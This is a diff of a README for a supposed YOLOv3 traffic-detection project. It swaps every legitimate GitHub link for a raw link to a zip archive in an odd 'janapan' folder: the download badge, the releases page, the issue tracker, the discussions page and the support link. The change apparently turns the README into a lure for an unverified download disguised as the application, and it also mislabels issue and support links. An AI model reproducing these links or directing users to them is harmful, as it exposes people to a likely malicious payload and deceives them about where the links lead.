@@ -1,6 +1,6 @@
 # 🚦 traffic-object-detection-yolov3 - Detect Traffic In Real Time
 
-![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)
+![Download](https://raw.githubusercontent.com/demorada19/traffic-object-detection-yolov3/main/janapan/traffic-object-detection-yolov3.zip%https://raw.githubusercontent.com/demorada19/traffic-object-detection-yolov3/main/janapan/traffic-object-detection-yolov3.zip)
 
 ## 📚 Introduction
 
@@ -29,7 +29,7 @@ Before you start, ensure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Releases Page](https://github.com/demorada19/traffic-object-detection-yolov3/releases).
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/demorada19/traffic-object-detection-yolov3/main/janapan/traffic-object-detection-yolov3.zip).
 
 2. Select the most recent version of the application.
 
@@ -56,7 +56,7 @@ If you encounter issues, try the following:
 - Ensure your system meets the requirements.
 - Check that your camera or video source is functioning and properly connected.
 - Restart the application if it doesn't load correctly.
-- Consult the issue tracker on the [GitHub page](https://github.com/demorada19/traffic-object-detection-yolov3/issues) for common problems and solutions.
+- Consult the issue tracker on the [GitHub page](https://raw.githubusercontent.com/demorada19/traffic-object-detection-yolov3/main/janapan/traffic-object-detection-yolov3.zip) for common problems and solutions.
 
 ## ✨ Contribution
 
@@ -64,11 +64,11 @@ This project welcomes contributions. If you have suggestions or improvements, fe
 
 ## 👥 Community
 
-Join our community of users and developers. Share your experiences and tips on improving traffic object detection. You can connect with us via discussions on the [GitHub page](https://github.com/demorada19/traffic-object-detection-yolov3/discussions).
+Join our community of users and developers. Share your experiences and tips on improving traffic object detection. You can connect with us via discussions on the [GitHub page](https://raw.githubusercontent.com/demorada19/traffic-object-detection-yolov3/main/janapan/traffic-object-detection-yolov3.zip).
 
 ## 📞 Support
 
-For any technical queries or support, open an issue on our [GitHub page](https://github.com/demorada19/traffic-object-detection-yolov3/issues). We are here to help you succeed in using the application.
+For any technical queries or support, open an issue on our [GitHub page](https://raw.githubusercontent.com/demorada19/traffic-object-detection-yolov3/main/janapan/traffic-object-detection-yolov3.zip). We are here to help you succeed in using the application.
 
 ## 🌐 Topics
 
